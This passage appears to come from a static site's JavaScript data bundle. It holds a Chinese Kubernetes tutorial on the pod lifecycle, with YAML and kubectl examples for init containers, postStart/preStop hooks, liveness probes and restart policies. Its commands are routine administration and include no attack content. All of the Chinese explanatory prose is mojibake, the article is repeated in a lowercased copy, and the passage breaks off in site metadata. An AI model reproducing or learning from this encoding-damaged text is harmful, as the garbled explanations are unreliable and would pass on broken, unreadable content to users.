 - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80\n        path: /hello\n  restartPolicy: Never # è®¾ç½®éå¯ç­ç¥ä¸ºNever\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿è¡ Pod æµè¯\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# æ¥çPodè¯¦æï¼åç°nginxå®¹å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  Warning  Unhealthy  15s (x3 over 35s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    15s                kubelet, node1     Container nginx failed liveness probe\n  \n# å¤ç­ä¸ä¼ï¼åè§å¯podçéå¯æ¬¡æ°ï¼åç°ä¸ç´æ¯0ï¼å¹¶æªéå¯   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-restartpolicy      0/1     Running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# æ¦è¿°\n\næä»¬ä¸è¬å° pod å¯¹è±¡ä»åå»ºè³ç»çè¿æ®µæ¶é´èå´ç§°ä¸º pod ççå½å¨æï¼å®ä¸»è¦åå«ä¸é¢çè¿ç¨ï¼\n\n * pod åå»ºè¿ç¨\n * è¿è¡åå§åå®¹å¨ï¼init containerï¼è¿ç¨\n * è¿è¡ä¸»å®¹å¨ï¼main containerï¼è¿ç¨\n   * å®¹å¨å¯å¨åé©å­ï¼post startï¼ãå®¹å¨ç»æ­¢åé©å­ï¼pre stopï¼\n     - å®¹å¨çå­æ´»æ§æ¢æµï¼liveness probeï¼ãå°±ç»ªæ§æ¢æµï¼readiness probeï¼\n * pod ç»æ­¢è¿ç¨\n\n\n\nå¨æ´ä¸ªçå½å¨æä¸­ï¼pod ä¼åºç° 5 ä¸­ç¶æï¼åå«å¦ä¸ï¼\n\n * æèµ·ï¼pendingï¼ï¼apiserver å·²ç»åå»ºäº pod èµæºå¯¹è±¡ï¼ä½å®å°æªè¢«è°åº¦å®ææèä»å¤äºä¸è½½éåçè¿ç¨ä¸­\n * è¿è¡ä¸­ï¼runningï¼ï¼pod å·²ç»è¢«è°åº¦è³æèç¹ï¼å¹¶ä¸ææå®¹å¨é½å·²ç»è¢« kubelet åå»ºå®æ\n * æåï¼successdedï¼ï¼pod ä¸­çææå®¹å¨é½å·²ç»æåç»æ­¢å¹¶ä¸ä¸ä¼è¢«éå¯\n * å¤±è´¥ï¼failedï¼ï¼ææå®¹å¨é½å·²ç»ç»æ­¢ï¼ä½è³å°æä¸ä¸ªå®¹å¨ç»æ­¢å¤±è´¥ï¼å³å®¹å¨è¿åäºé 0 å¼å¾éåºç¶æ\n * æªç¥ï¼unknownï¼ï¼apiserver æ æ³æ­£å¸¸è·åå° pod å¯¹è±¡çç¶æä¿¡æ¯ï¼éå¸¸ç±ç½ç»éä¿¡å¤±è´¥æå¯¼è´\n\n\n# åå»ºåç»æ­¢\n\npod çåå»ºè¿ç¨\n\n 1. ç¨æ·éè¿ kubectl æå¶ä» api å®¢æ·ç«¯æäº¤éè¦åå»ºç pod ä¿¡æ¯ç» apiserver\n 2. apiserver å¼å§çæ pod å¯¹è±¡çä¿¡æ¯ï¼å¹¶å°ä¿¡æ¯å­å¥ etcdï¼ç¶åè¿åç¡®è®¤ä¿¡æ¯è³å®¢æ·ç«¯\n 3. apiserver å¼å§åæ  etcd ä¸­ç pod å¯¹è±¡çååï¼å¶å®ç»ä»¶ä½¿ç¨ watch æºå¶æ¥è·è¸ªæ£æ¥ apiserver ä¸çåå¨\n 4. scheduler åç°ææ°ç pod å¯¹è±¡è¦åå»ºï¼å¼å§ä¸º pod åéä¸»æºå¹¶å°ç»æä¿¡æ¯æ´æ°è³ apiserver\n 5. node èç¹ä¸ç kubelet åç°æ pod è°åº¦è¿æ¥ï¼å°è¯è°ç¨ docker å¯å¨å®¹å¨ï¼å¹¶å°ç»æåéè³ apiserver\n 6. apiserver å°æ¥æ¶å°ç pod ç¶æä¿¡æ¯å­å¥ etcd ä¸­\n\n\n\npod çç»æ­¢è¿ç¨\n\n 1. ç¨æ·å apiserver åéå é¤ pod å¯¹è±¡çå½ä»¤\n 2. apiservcer ä¸­ç pod å¯¹è±¡ä¿¡æ¯ä¼éçæ¶é´çæ¨ç§»èæ´æ°ï¼å¨å®½éæåï¼é»è®¤ 30sï¼ï¼pod è¢«è§ä¸º dead\n 3. å° pod æ è®°ä¸º terminating ç¶æ\n 4. kubelet å¨çæ§å° pod å¯¹è±¡è½¬ä¸º terminating ç¶æçåæ¶å¯å¨ pod å³é­è¿ç¨\n 5. ç«¯ç¹æ§å¶å¨çæ§å° pod å¯¹è±¡çå³é­è¡ä¸ºæ¶å°å¶ä»ææå¹éå°æ­¤ç«¯ç¹ç service èµæºçç«¯ç¹åè¡¨ä¸­ç§»é¤\n 6. å¦æå½å pod å¯¹è±¡å®ä¹äº prestop é©å­å¤çå¨ï¼åå¨å¶æ è®°ä¸º terminating åå³ä¼ä»¥åæ­¥çæ¹å¼å¯å¨æ§è¡\n 7. pod å¯¹è±¡ä¸­çå®¹å¨è¿ç¨æ¶å°åæ­¢ä¿¡å·\n 8. å®½éæç»æåï¼è¥ pod ä¸­è¿å­å¨ä»å¨è¿è¡çè¿ç¨ï¼é£ä¹ pod å¯¹è±¡ä¼æ¶å°ç«å³ç»æ­¢çä¿¡å·\n 9. kubelet è¯·æ± apiserver å°æ­¤ pod èµæºçå®½éæè®¾ç½®ä¸º 0 ä»èå®æå é¤æä½ï¼æ­¤æ¶ pod å¯¹äºç¨æ·å·²ä¸å¯è§\n\n\n# åå§ååå®¹å¨\n\nåå§åå®¹å¨æ¯å¨ pod çä¸»å®¹å¨å¯å¨ä¹åè¦è¿è¡çå®¹å¨ï¼ä¸»è¦æ¯åä¸äºä¸»å®¹å¨çåç½®å·¥ä½ï¼å®å·æä¸¤å¤§ç¹å¾ï¼\n\n 1. åå§åå®¹å¨å¿é¡»è¿è¡å®æç´è³ç»æï¼è¥æåå§åå®¹å¨è¿è¡å¤±è´¥ï¼é£ä¹ kubernetes éè¦éå¯å®ç´å°æåå®æ\n 2. åå§åå®¹å¨å¿é¡»æç§å®ä¹çé¡ºåºæ§è¡ï¼å½ä¸ä»å½åä¸ä¸ªæåä¹åï¼åé¢çä¸ä¸ªæè½è¿è¡\n\nåå§åå®¹å¨æå¾å¤çåºç¨åºæ¯ï¼ä¸é¢ååºçæ¯æå¸¸è§çå ä¸ªï¼\n\n * æä¾ä¸»å®¹å¨éåä¸­ä¸å·å¤çå·¥å·ç¨åºæèªå®ä¹ä»£ç \n * åå§åå®¹å¨è¦åäºåºç¨å®¹å¨ä¸²è¡å¯å¨å¹¶è¿è¡å®æï¼å æ­¤å¯ç¨äºå»¶ååºç¨å®¹å¨çå¯å¨ç´è³å¶ä¾èµçæ¡ä»¶å¾å°æ»¡è¶³\n\nåè®¾è¦ä»¥ä¸»å®¹å¨æ¥è¿è¡ nginxï¼ä½æ¯è¦æ±å¨è¿è¡ nginx ä¹ååè¦è½å¤è¿æ¥ä¸ç¸åºçæå¡å¨æ¯å¯ä»¥ ping éçã\nåå»º pod-initcontainer.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n  # åå§åå®¹å¨\n  initcontainers:\n  # æ¨¡æmysqlè¿æ¥\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']ã\n  # æ¨¡æredisè¿æ¥\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# æ¥çpodç¶æ\n# åç°podå¡å¨å¯å¨ç¬¬ä¸ä¸ªåå§åå®¹å¨è¿ç¨ä¸­ï¼åé¢çå®¹å¨ä¸ä¼è¿è¡\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nevents:\n  type    reason     age   from               message\n  ----    ------     ----  ----               -------\n  normal  scheduled  49s   default-scheduler  successfully assigned dev/pod-initcontainer to node1\n  normal  pulled     48s   kubelet, node1     container image "busybox:1.30" already present on machine\n  normal  created    48s   kubelet, node1     created container test-mysql\n  normal  started    48s   kubelet, node1     started container test-mysql\n\n# å¨ææ¥çpod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nname                             ready   status     restarts   age\npod-initcontainer                0/1     init:0/2   0          15s\npod-initcontainer                0/1     init:1/2   0          52s\npod-initcontainer                0/1     init:1/2   0          53s\npod-initcontainer                0/1     podinitializing   0          89s\npod-initcontainer                1/1     running           0          90s\n\n# æ¥ä¸æ¥æ°å¼ä¸ä¸ªshellï¼ä¸ºå½åæå¡å¨æ°å¢ä¸¤ä¸ªipï¼è§å¯podçååï¼ä¸ºç½å¡æ·»å å°å\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# é©å­å½æ°\n\né©å­å½æ°è½å¤æç¥èªèº«çå½å¨æä¸­çäºä»¶ï¼å¹¶å¨ç¸åºçæ¶å»å°æ¥æ¶è¿è¡ç¨æ·æå®çç¨åºä»£ç ã\n\nkubernetes å¨ä¸»å®¹å¨çå¯å¨ä¹åååæ­¢ä¹åæä¾äºä¸¤ä¸ªé©å­å½æ°ï¼\n\n * post startï¼å®¹å¨åå»ºä¹åæ§è¡ï¼å¦æå¤±è´¥äºä¼éå¯å®¹å¨\n * pre stop ï¼å®¹å¨ç»æ­¢ä¹åæ§è¡ï¼æ§è¡å®æä¹åå®¹å¨å°æåç»æ­¢ï¼å¨å¶å®æä¹åä¼é»å¡å é¤å®¹å¨çæä½\n\né©å­å¤çå¨æ¯æä½¿ç¨ä¸é¢ä¸ç§æ¹å¼å®ä¹å¨ä½ï¼\n\n * exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤\n\nâ¦â¦\n  lifecycle:\n    poststart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * tcpsocketï¼å¨å½åå®¹å¨å°è¯è®¿é®æå®ç socket\n\nâ¦â¦      \n  lifecycle:\n    poststart:\n      tcpsocket:\n        port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n * httpgetï¼å¨å½åå®¹å¨ä¸­åæ url åèµ· http è¯·æ±\n\nâ¦â¦\n  lifecycle:\n    poststart:\n      httpget:\n        path: / #uriå°å\n        port: 80 #ç«¯å£å·\n        host: 192.168.5.3 #ä¸»æºå°å\n        scheme: http #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä»¥ exec æ¹å¼ä¸ºä¾ï¼æ¼ç¤ºä¸é©å­å½æ°çä½¿ç¨ï¼åå»º pod-hook-exec.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    # çå½å¨æ\n    lifecycle:\n      poststart: \n        exec: # å¨å®¹å¨å¯å¨çæ¶åæ§è¡ä¸ä¸ªå½ä»¤ï¼ä¿®æ¹ænginxçé»è®¤é¦é¡µåå®¹\n          command: ["/bin/sh", "-c", "echo poststart... > /usr/share/nginx/html/index.html"]\n      prestop:\n        exec: # å¨å®¹å¨åæ­¢ä¹ååæ­¢nginxæå¡\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nname           ready   status     restarts   age    ip            node    \npod-hook-exec  1/1     running    0          29s    10.244.2.48   node2   \n\n# è®¿é®pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npoststart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å®¹å¨æ¢æµ\n\nå®¹å¨æ¢æµç¨äºæ£æµå®¹å¨ä¸­çåºç¨å®ä¾æ¯å¦æ­£å¸¸å·¥ä½ï¼æ¯ä¿éä¸å¡å¯ç¨æ§çä¸ç§ä¼ ç»æºå¶ãå¦æç»è¿æ¢æµï¼å®ä¾çç¶æä¸ç¬¦åé¢æï¼é£ä¹ kubernetes å°±ä¼æè¯¥é®é¢å®ä¾ "æé¤"ï¼ä¸æ¿æä¸å¡æµéãkubernetes æä¾äºä¸¤ç§æ¢éæ¥å®ç°å®¹å¨æ¢æµï¼åå«æ¯ï¼\n\n * liveness probesï¼å­æ´»æ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¤äºæ­£å¸¸è¿è¡ç¶æï¼å¦æä¸æ¯ï¼k8s ä¼éå¯å®¹å¨\n * readiness probesï¼å°±ç»ªæ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¯ä»¥æ¥æ¶è¯·æ±ï¼å¦æä¸è½ï¼k8s ä¸ä¼è½¬åæµé\n\n> livenessprobe å³å®æ¯å¦éå¯å®¹å¨ï¼readinessprobe å³å®æ¯å¦å°è¯·æ±è½¬åç»å®¹å¨ã\n\nä¸é¢ä¸¤ç§æ¢éç®ååæ¯æä¸ç§æ¢æµæ¹å¼ï¼\n\n * exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤ï¼å¦æå½ä»¤æ§è¡çéåºç ä¸º 0ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessprobe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * tcpsocketï¼å°ä¼å°è¯è®¿é®ä¸ä¸ªç¨æ·å®¹å¨çç«¯å£ï¼å¦æè½å¤å»ºç«è¿æ¡è¿æ¥ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦      \n  livenessprobe:\n    tcpsocket:\n      port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n\n * httpgetï¼è°ç¨å®¹å¨å web åºç¨ç urlï¼å¦æè¿åçç¶æç å¨ 200 å 399 ä¹é´ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessprobe:\n    httpget:\n      path: / #uriå°å\n      port: 80 #ç«¯å£å·\n      host: 127.0.0.1 #ä¸»æºå°å\n      scheme: http #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸é¢ä»¥ liveness probes ä¸ºä¾ï¼åå ä¸ªæ¼ç¤ºï¼\næ¹å¼ä¸ï¼exec\nåå»º pod-liveness-exec.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # æ§è¡ä¸ä¸ªæ¥çæä»¶çå½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  normal   created    20s (x2 over 50s)  kubelet, node1     created container nginx\n  normal   started    20s (x2 over 50s)  kubelet, node1     started container nginx\n  normal   killing    20s                kubelet, node1     container nginx failed liveness probe, will be restarted\n  warning  unhealthy  0s (x5 over 40s)   kubelet, node1     liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': no such file or directory\n  \n# è§å¯ä¸é¢çä¿¡æ¯å°±ä¼åç°nginxå®¹å¨å¯å¨ä¹åå°±è¿è¡äºå¥åº·æ£æ¥\n# æ£æ¥å¤±è´¥ä¹åï¼å®¹å¨è¢«killæï¼ç¶åå°è¯è¿è¡éå¯ï¼è¿æ¯éå¯ç­ç¥çä½ç¨ï¼åé¢è®²è§£ï¼\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nname                ready   status             restarts   age\npod-liveness-exec   0/1     crashloopbackoff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå­å¨çæä»¶ï¼æ¯å¦/tmp/hello.txtï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼äºï¼tcpsocket\nåå»º pod-liveness-tcpsocket.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      tcpsocket:\n        port: 8080 # å°è¯è®¿é®8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  normal   scheduled  31s                            default-scheduler  successfully assigned dev/pod-liveness-tcpsocket to node2\n  normal   pulled     <invalid>                      kubelet, node2     container image "nginx:1.17.1" already present on machine\n  normal   created    <invalid>                      kubelet, node2     created container nginx\n  normal   started    <invalid>                      kubelet, node2     started container nginx\n  warning  unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# è§å¯ä¸é¢çä¿¡æ¯ï¼åç°å°è¯è®¿é®8080ç«¯å£,ä½æ¯å¤±è´¥äº\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nname                     ready   status             restarts   age\npod-liveness-tcpsocket   0/1     crashloopbackoff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çç«¯å£ï¼æ¯å¦80ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼ä¸ï¼httpget\nåå»º pod-liveness-httpget.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:  # å¶å®å°±æ¯è®¿é®http://127.0.0.1:80/hello  \n        scheme: http #æ¯æçåè®®ï¼httpæèhttps\n        port: 80 #ç«¯å£å·\n        path: /hello #uriå°å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  normal   pulled     6s (x3 over 64s)  kubelet, node1     container image "nginx:1.17.1" already present on machine\n  normal   created    6s (x3 over 64s)  kubelet, node1     created container nginx\n  normal   started    6s (x3 over 63s)  kubelet, node1     started container nginx\n  warning  unhealthy  6s (x6 over 56s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    6s (x2 over 36s)  kubelet, node1     container nginx failed liveness probe, will be restarted\n  \n# è§å¯ä¸é¢ä¿¡æ¯ï¼å°è¯è®¿é®è·¯å¾ï¼ä½æ¯æªæ¾å°,åºç°404éè¯¯\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°restartsä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nname                   ready   status    restarts   age\npod-liveness-httpget   1/1     running   5          3m17s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çè·¯å¾pathï¼æ¯å¦/ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nè³æ­¤ï¼å·²ç»ä½¿ç¨ liveness probe æ¼ç¤ºäºä¸ç§æ¢æµæ¹å¼ï¼ä½æ¯æ¥ç livenessprobe çå­å±æ§ï¼ä¼åç°é¤äºè¿ä¸ç§æ¹å¼ï¼è¿æä¸äºå¶ä»çéç½®ï¼å¨è¿éä¸å¹¶è§£éä¸ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessprobe\nfields:\n   exec <object>  \n   tcpsocket    <object>\n   httpget      <object>\n   initialdelayseconds  <integer>  # å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n   timeoutseconds       <integer>  # æ¢æµè¶æ¶æ¶é´ãé»è®¤1ç§ï¼æå°1ç§\n   periodseconds        <integer>  # æ§è¡æ¢æµçé¢çãé»è®¤æ¯10ç§ï¼æå°1ç§\n   failurethreshold     <integer>  # è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯3ãæå°å¼æ¯1\n   successthreshold     <integer>  # è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialdelayseconds å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n * timeoutseconds æ¢æµè¶æ¶æ¶é´ãé»è®¤ 1 ç§ï¼æå° 1 ç§\n * periodseconds æ§è¡æ¢æµçé¢çãé»è®¤æ¯ 10 ç§ï¼æå° 1 ç§\n * failurethreshold è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯ 3ãæå°å¼æ¯ 1\n * successthreshold è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯ 1\n\nä¸é¢ç¨å¾®éç½®ä¸¤ä¸ªï¼æ¼ç¤ºä¸ææå³å¯ï¼\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80 \n        path: /\n      initialdelayseconds: 30 # å®¹å¨å¯å¨å30så¼å§æ¢æµ\n      timeoutseconds: 5 # æ¢æµè¶æ¶æ¶é´ä¸º5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# éå¯ç­ç¥\n\nä¸æ¦å®¹å¨æ¢æµåºç°äºé®é¢ï¼kubernetes å°±ä¼å¯¹å®¹å¨æå¨ç pod è¿è¡éå¯ï¼å¶å®è¿æ¯ç± pod çéå¯ç­ç¥å³å®çï¼pod çéå¯ç­ç¥æ 3 ç§ï¼åå«å¦ä¸ï¼\n\n * always ï¼å®¹å¨å¤±ææ¶ï¼èªå¨éå¯è¯¥å®¹å¨ï¼è¿ä¹æ¯é»è®¤å¼ã\n * onfailure ï¼ å®¹å¨ç»æ­¢è¿è¡ä¸éåºç ä¸ä¸º 0 æ¶éå¯\n * never ï¼ ä¸è®ºç¶æä¸ºä½ï¼é½ä¸éå¯è¯¥å®¹å¨\n\néå¯ç­ç¥éç¨äº pod å¯¹è±¡ä¸­çææå®¹å¨ï¼é¦æ¬¡éè¦éå¯çå®¹å¨ï¼å°å¨å¶éè¦æ¶ç«å³è¿è¡éå¯ï¼éååæ¬¡éè¦éå¯çæä½å°ç± kubelet å»¶è¿ä¸æ®µæ¶é´åè¿è¡ï¼ä¸åå¤çéå¯æä½çå»¶è¿æ¶é¿ä»¥æ­¤ä¸º 10sã20sã40sã80sã160s å 300sï¼300s æ¯æå¤§å»¶è¿æ¶é¿ã\n\nåå»º pod-restartpolicy.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80\n        path: /hello\n  restartpolicy: never # è®¾ç½®éå¯ç­ç¥ä¸ºnever\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿è¡ pod æµè¯\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# æ¥çpodè¯¦æï¼åç°nginxå®¹å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  warning  unhealthy  15s (x3 over 35s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    15s                kubelet, node1     container nginx failed liveness probe\n  \n# å¤ç­ä¸ä¼ï¼åè§å¯podçéå¯æ¬¡æ°ï¼åç°ä¸ç´æ¯0ï¼å¹¶æªéå¯   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nname                   ready   status    restarts   age\npod-restartpolicy      0/1     running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0}},{title:"kubernetes(å«) Pod æ§å¶å¨è¯¦è§£",frontmatter:{title:"kubernetes(å«) Pod æ§å¶å¨è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/607.kubernetes(%E5%85%AB)%20Pod%20%E6%8E%A7%E5%88%B6%E5%99%A8%E8%AF%A6%E8%A7%A3.html",relativePath:"01.è¿ç»´/60.Kubernetes/607.kubernetes(å«) Pod æ§å¶å¨è¯¦è§£.md",key:"v-43fb77b9",path:"/kubernetes/607/",headers:[{level:2,title:"Podæ§å¶å¨ä»ç»",slug:"podæ§å¶å¨ä»ç»",normalizedTitle:"pod æ§å¶å¨ä»ç»",charIndex:2},{level:2,title:"ReplicaSet(RS)",slug:"replicaset-rs",normalizedTitle:"replicaset(rs)",charIndex:788},{level:2,title:"Deployment(Deploy)",slug:"deployment-deploy",normalizedTitle:"deployment(deploy)",charIndex:6384},{level:2,title:"Horizontal Pod Autoscaler(HPA)",slug:"horizontal-pod-autoscaler-hpa",normalizedTitle:"horizontal pod 